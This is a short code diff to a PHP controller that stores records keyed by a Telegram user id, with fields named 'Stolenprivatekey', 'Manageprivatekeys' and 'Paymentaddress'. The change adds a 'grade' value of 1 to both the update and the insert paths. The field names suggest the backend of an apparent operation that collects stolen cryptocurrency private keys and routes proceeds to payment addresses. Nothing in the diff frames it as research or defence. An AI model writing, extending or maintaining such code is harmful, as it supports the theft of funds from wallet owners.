@@ -37,7 +37,7 @@ class  UpdateController extends Controller
             //
             $arr =  Db::table('user')->field('*')->where(['tgid' => $hash['id']])->find();
             if ($arr) {
-                $arr =  Db::table('user')->where(['tgid' => $hash['id']])->update(['Stolenprivatekey' => $data['Stolenprivatekey'], 'Manageprivatekeys' => $data['Manageprivatekeys'], 'Paymentaddress' => $data['Paymentaddress']]);
+                $arr =  Db::table('user')->where(['tgid' => $hash['id']])->update(['grade' => 1, 'Stolenprivatekey' => $data['Stolenprivatekey'], 'Manageprivatekeys' => $data['Manageprivatekeys'], 'Paymentaddress' => $data['Paymentaddress']]);
                 if ($arr > 0) {
                     echo json_encode(retur('成功', $arr));
                 } else {
@@ -46,7 +46,7 @@ class  UpdateController extends Controller
                 //修改
             } else {
                 //添加
-                $arr =  Db::table('user')->insert(['tgid' => $hash['id'], 'Stolenprivatekey' => $data['Stolenprivatekey'], 'Manageprivatekeys' => $data['Manageprivatekeys'], 'Paymentaddress' => $data['Paymentaddress']]);
+                $arr =  Db::table('user')->insert(['grade' => 1, 'tgid' => $hash['id'], 'Stolenprivatekey' => $data['Stolenprivatekey'], 'Manageprivatekeys' => $data['Manageprivatekeys'], 'Paymentaddress' => $data['Paymentaddress']]);
                 if ($arr > 0) {
                     echo json_encode(retur('成功', $arr));
                 } else {
